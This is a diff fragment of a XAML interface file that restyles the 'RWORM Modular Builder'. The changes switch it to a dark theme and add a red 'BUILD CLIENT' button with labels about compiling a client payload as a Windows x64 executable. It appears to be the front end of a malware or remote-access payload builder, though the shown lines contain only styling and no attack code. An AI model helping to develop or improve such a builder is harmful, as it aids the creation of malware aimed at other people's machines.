-                                    <TextBlock Text="{Binding StatusMessage}" FontSize="12" Foreground="#2563EB" FontWeight="SemiBold" Margin="0,8,0,0"/>
+                                    <TextBlock Text="Ready to compile client payload." FontSize="14" FontWeight="SemiBold" Foreground="#E6EDF3"/>
+                                    <TextBlock Text="Compiled binary will be packaged as a standalone executable." FontSize="12" Foreground="#8B949E" Margin="0,4,0,0"/>
+                                    <TextBlock Text="{Binding StatusMessage}" FontSize="12" Foreground="#58A6FF" FontWeight="SemiBold" Margin="0,8,0,0"/>
                                 </StackPanel>
 
-                                <Button Grid.Column="1"
+                                <!-- Red/Green Build Button as in drawing -->
+                                <Button Grid.Column="1" Content="🚀 BUILD CLIENT"
                                         Command="{Binding BuildCommand}"
-                                        Background="#16A34A" Foreground="White"
+                                        Background="#DA3633" Foreground="White"
                                         FontSize="14" FontWeight="Bold"
                                         Height="48" Width="220" Cursor="Hand" Margin="16,0,0,0">
                                     <Button.Template>
                                         <ControlTemplate TargetType="Button">
-                                            <Border Background="{TemplateBinding Background}" CornerRadius="8">
-                                                <StackPanel Orientation="Horizontal" HorizontalAlignment="Center" VerticalAlignment="Center">
-                                                    <Image Source="pack://application:,,,/Resources/Assets/builder.png" Width="20" Height="20" Margin="0,0,10,0" VerticalAlignment="Center"/>
-                                                    <TextBlock Text="BUILD CLIENT" FontSize="14" FontWeight="Bold" Foreground="White" VerticalAlignment="Center"/>
-                                                </StackPanel>
+                                            <Border Background="{TemplateBinding Background}" CornerRadius="8"
+                                                    BorderBrush="#F85149" BorderThickness="1.5">
+                                                <ContentPresenter HorizontalAlignment="Center" VerticalAlignment="Center"/>
                                             </Border>
                                             <ControlTemplate.Triggers>
                                                 <Trigger Property="IsMouseOver" Value="True">
-                                                    <Setter Property="Background" Value="#15803D"/>
+                                                    <Setter Property="Background" Value="#B62324"/>
                                                 </Trigger>
                                             </ControlTemplate.Triggers>
                                         </ControlTemplate>
@@ -429,14 +427,14 @@
         </TabControl>
 
         <!-- Status Bar -->
-        <Border Grid.Row="2" Background="#FFFFFF" BorderBrush="#E2E8F0" BorderThickness="0,1,0,0">
-            <Grid Margin="18,0">
+        <Border Grid.Row="2" Background="#161B22" BorderBrush="#30363D" BorderThickness="0,1,0,0">
+            <Grid Margin="16,0">
                 <StackPanel Orientation="Horizontal" HorizontalAlignment="Left" VerticalAlignment="Center">
-                    <Ellipse Width="8" Height="8" Fill="#10B981" Margin="0,0,8,0"/>
-                    <TextBlock Text="Ready — RWORM Modular Builder" FontSize="12" Foreground="#64748B"/>
+                    <Ellipse Width="8" Height="8" Fill="#3FB950" Margin="0,0,8,0"/>
+                    <TextBlock Text="Ready — RWORM Modular Builder" FontSize="12" Foreground="#8B949E"/>
                 </StackPanel>
                 <StackPanel Orientation="Horizontal" HorizontalAlignment="Right" VerticalAlignment="Center">
-                    <TextBlock Text="Payload: Windows x64 (~11 MB)" FontSize="12" Foreground="#64748B"/>
+                    <TextBlock Text="Payload: Windows x64 (~11 MB)" FontSize="12" Foreground="#8B949E"/>
                 </StackPanel>
             </Grid>
         </Border>
